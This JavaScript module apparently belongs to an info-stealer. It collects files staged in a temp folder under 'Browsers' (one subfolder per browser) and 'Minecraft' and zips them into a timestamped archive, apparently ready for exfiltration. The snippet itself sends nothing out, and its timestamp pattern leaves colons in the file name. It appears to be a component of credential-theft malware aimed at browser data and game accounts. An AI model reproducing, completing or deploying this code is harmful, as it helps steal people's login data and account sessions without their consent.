const { tempFolder } = require('../index');
const { join, sep } = require('path');
const fs = require('fs');
const { generateZipFromFiles } = require('../util/zip');

const paths = [tempFolder, join(tempFolder, 'Browsers'), join(tempFolder, 'Minecraft')];
fs.readdirSync(join(tempFolder, 'Browsers')).forEach((folder) => paths.push(join(tempFolder, 'Browsers', folder)));

const files = fs.readdirSync(tempFolder).filter(file => file.split('.').length > 1);
paths.forEach(path => {
  fs.readdirSync(path).filter(file => file.split('.').length > 1).forEach(file => {
    files.push(join(path.split(tempFolder.split(sep).pop())[1].replace(sep, ''), file));
  });
});

const name = new Date().toISOString().replaceAll(/[-\tT]/g, '_').replace('Z', '') + '.zip';
module.exports = generateZipFromFiles(paths, files, join(tempFolder, name));
